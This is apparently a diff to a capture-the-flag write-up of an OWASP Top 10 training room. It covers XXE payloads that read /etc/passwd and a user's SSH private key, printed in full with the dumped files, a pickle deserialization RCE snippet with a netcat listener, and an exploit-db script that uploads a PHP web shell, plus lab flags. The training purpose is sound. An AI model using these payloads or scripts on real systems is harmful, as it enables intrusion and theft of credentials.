@@ -130,7 +130,97 @@ DTD stands for Document Type Definition. A DTD defines the structure and the leg
 
 **Payload:**
 
-`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]><root>&read;</root>`
+```markup
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+```
+
+_**\#3 What is the name of the user in /etc/passwd**_
+
+**Payload**
+
+```markup
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+```
+
+```http
+root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/us
+r/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:
+/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:
+5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache
+/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nolog
+inmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/va
+r/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:
+/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-d
+ata:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:ba
+ckup:/var/backups:/usr/sbin/nologinlist:x:38:38:MailingListManag
+er:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/us
+r/sbin/nologingnats:x:41:41:GnatsBug-ReportingSystem(admin):/var
+/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexis
+tent:/usr/sbin/nologinsystemd-network:x:100:102:systemdNetworkMa
+nagement,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:
+x:101:103:systemdResolver,,,:/run/systemd/resolve:/usr/sbin/nolo
+ginsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:
+103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexi
+stent:/usr/sbin/nologinlxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologindnsmasq:x:107:65534
+:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinlandscape:x:108:112::
+/var/lib/landscape:/usr/sbin/nologinsshd:x:109:65534::/run/sshd:
+/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/fa
+lsefalcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
+```
+
+Flag: `falcon`
+
+_**\#4 Where is falcon's SSH key located?**_
+
+We first need to know where the SSH key is stored on a Linux machine. After some googling, I found the exact location and file in which this key is stored and that is `/home/<username>/.ssh/id_rsa`
+
+Flag: `/home/falcon/.ssh/id_rsa`
+
+_**\#5 What are the first 18 characters for falcon's private key**_
+
+**Payload**
+
+```bash
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
+<root>&read;</root>
+```
+
+```bash
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEA7bq7Uj0ZQzFiWzKc81OibYfCGhA24RYmcterVvRvdxw0IVSC
+lZ9oM4LiwzqRIEbed7/hAA0wu6Tlyy+oLHZn2i3pLur07pxb0bfYkr7r5DaKpRPB
+2Echy67MiXAQu/xgHd1e7tST18B+Ubnwo4YZNxQa+vhHRx4G5NLRL8sT+Vj9atKN
+MfJmbzClgOKpTNgBaAkzY5ueWww9g0CkCldOBCM38nkEwLJAzCKtaHSreXFNN2hQ
+IGfizQYRDWH1EyDbaPmvZmy0lEELfMR18wjYF1VBTAl8PNCcqVVDaKaIrbnshQpO
+HoqIKrf3wLn4rnU9873C3JKzX1aDP6q+P+9BlwIDAQABAoIBABnNP5GAciJ51KwD
+RUeflyx+JJIBmoM5jTi/sagBZauu0vWfH4EvyPZ2SThZPfEb3/9tQvVneReUoSA5
+bu5Md58Vho6CD81qCQktBAOBV0bwqIGcMFjR95gMw8RS9m4AyUnUgf438kfja5Jh
+NP36ivgQZZFBqzLLzoG9Y9jlGKjiSyMvW4u63ZacCKPTpp5P53794/UVU7JiM03y
+OvavZ2QveJp5BndV5lOkcIEFwFRACDK1xwzDRzx/TNJLufztb2EheMc3stNuOMea
+TLKlbG0Mp/c2az8vNN6HA0QiwxYlKZ58RfdsOfbsFxAltYNnzxy9UEieXtrWVg7X
+Qfi/ZeECgYEA/pfgg6BClEmipXv8hVkLWe7VwlFf4RXnxfWyi6OqC/3Yt9Q9B4Ya
+6bgLzk2vPNHgJt+g2yh/TzMX6sCC9IMYedc0faiJr/VISBm25qTjqIGctwt0D3nb
+j60mSKKFbwDPxrcek/7WH1cWDcaLTDdL9KPLk1JQzbwDzojrE1TDD+cCgYEA7wsA
+MPm4aUDikZHKhQ5OOge+wzPNXVR6Yy1VV3WZfxRCoEuq6fYEJsKB5tykfQPC8cUn
+qwGvo8TiMHbQ9KmI5FabfBK8LswQ575bnLtMxdPyBCgYqlsAIkPYQAOizUVlrOOg
+faKF5VknsONM9DC3ZNx5L1zQXbsIrWbEPsRlytECgYB7CXr/IZwLfeqUfu7yoq3R
+sJKtbhYf+S4hhTPcOCQd13e8n10/HZg0CzXpZbGieusQ3lIml9Ouusp8ML0Y3aIe
+f9pmP+UKnEdqUMMLg/RhowHRlD9qm0F4lf1CbQh/NK01I5ore6SPUM7fqWv4UWDr
+wZzIfad/RbWxQooYtYXvUQKBgFDLcBIdpYX1x16aX1AfqLMWgRSrQqNj9UXmQa0g
+83OvXmGdkbQoUfjjz1I/i10x00cycxjqpfn9htIIptG7J6i92SnTj0Vl9eTOQ1qz
+N9y5qVhcURHrVh0+vy3LzNACv73y5gDw2L7PJoo0GYODn8j4eAFZJpg3qlQpovTw
+HtOxAoGABqwywFKFNTYgrl17Rs4g3H1nc0EhOzGetRaRL2bcvQsZevuWyswp0Mbm
+9nlgNAtxttsmfL+OU7nP3I4YQlyZed4luRWcRaXrvGMqfEL4wzRez5ZxMnZM/IlQ
+9DBlD9C7t5MI3aXR3A5zFVVINomwHH7aGfeha1JRXXAtasLTVvA=
+-----END RSA PRIVATE KEY-----
+```
+
+Flag: `MIIEogIBAAKCAQEA7b`
 
 ## **Day 5 – Broken Access Control**
 
@@ -153,6 +243,15 @@ Security misconfigurations include:
 * Not using [HTTP security headers](https://owasp.org/www-project-secure-headers/), or revealing too much detail in the Server: HTTP header
 
 This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XXE or command injection on admin pages. For more information [https://owasp.org/www-project-top-ten/OWASP\_Top\_Ten\_2017/Top\_10-2017\_A6-Security\_Misconfiguration](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration)
+
+_**\#2 Hack into the web app, and find the flag!**_
+
+> _**Hint:**_ Can you find the app's source code? Maybe the documentation gives you default credentials that you can try.
+
+  
+****After a while looking for the flag in the source code. I've tried to find the name of the app in the Github. People sometimes use GitHub to store their web apps' source code and documentation, then I found a repo [https://github.com/NinjaJc01/PensiveNotes](https://github.com/NinjaJc01/PensiveNotes). Look at the README.md file I could see the credential
+
+Flag: `thm{4b9513968fd564a87b28aa1f9d672e17}`
 
 ## **Day 7 –** Cross-site Scripting \(XSS\)
 
@@ -278,11 +377,11 @@ _**\#1 flag.txt**_
 
 Just follow the guide in the room -\_-
 
-```text
+```bash
 root@kali:~# nc -lvnp 4444
 ```
 
-```text
+```python
 // this is content of rce.py
 import pickle
 import sys
@@ -298,7 +397,7 @@ class rce(object):
 print(base64.b64encode(pickle.dumps(rce())))
 ```
 
-```text
+```bash
 root@kali:~! python3 rce.py
 ```
 
@@ -322,7 +421,7 @@ _**\#1 How many characters are in /etc/passwd \(use wc -c /etc/passwd to get the
 
 Following the guide, I've found a exploit in  [exploit-db](https://www.exploit-db.com/exploits/47887) by searching "Unauthenticated Remote Code Execution" . Then I've got this code then save it as rce.py and run it.
 
-```text
+```python
 import argparse
 import random
 import requests
@@ -362,13 +461,13 @@ else:
         print('> Web shell failed to upload! The web server may not have write permissions.')
 ```
 
-```text
+```bash
 root@kali:~! python rce.py [url]  // url means url of your target
 ```
 
 Finally, I've got the shell. I've used `wc /etc/password` to counts the number of characters, words and lines. The example here is trying to see how many entries in `/etc/passwd`
 
-```text
+```bash
 > Attempting to upload PHP web shell...
 > Verifying shell upload...
 > Web shell uploaded to http://10.10.90.249/bootstrap/img/TVgBS1aAhU.php
@@ -408,7 +507,7 @@ Just detecting suspicious activity isn't helpful. This suspicious activity needs
 
 _**\#1 What IP address is the attacker using?**_
 
-```text
+```http
 // login-logs.txt
 200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
 200 OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
